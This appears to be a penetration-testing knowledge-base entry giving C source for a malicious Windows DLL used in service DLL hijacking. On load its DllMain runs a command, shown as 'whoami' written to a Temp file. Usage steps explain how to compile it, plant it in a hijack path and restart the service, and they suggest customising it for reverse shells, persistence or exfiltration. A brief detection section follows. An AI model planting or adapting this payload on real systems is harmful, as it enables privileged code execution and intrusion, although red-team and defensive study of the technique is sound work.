---
id: a9d4f5a1-c0ba-4e29-8b9e-e1b62de1ad16
type: code
name: Malicious-DLL-for-Service-Hijack
language: C
verified: true
created_at: '2023-04-06T03:56:29.436559+00:00'
updated_at: '2023-04-10T20:37:37.001468+00:00'
platforms:
  - Windows
tags:
  - dll-hijacking
  - payload
validated: true
---

# Malicious-DLL-for-Service-Hijack

## Code

```c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

## Description

This C code defines a malicious Windows DLL that executes a system command (e.g., whoami output to file) when loaded via DllMain during process attach, typically triggered by a vulnerable service attempting to load a missing DLL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Hardcoded payload; modify system() call for custom actions (e.g., reverse shell) | N/A |

## Usage

Compile with MinGW (see [[commands/gcc-compile-malicious-dll-x64]]), place in hijack path identified by PowerUp. Restart service to load and execute. Customize payload in DllMain for persistence or exfil.

## Detection

- Monitor DLL loads in service processes via ProcMon or ETW.
- Check for unexpected files in C:\\Windows\\Temp\\ or anomalous cmd.exe spawns from services (Event ID 4688).
- AV signatures for suspicious DllMain implementations.

## Related

- [[procedures/Windows-Local-Service-Permissions-Escalation]]
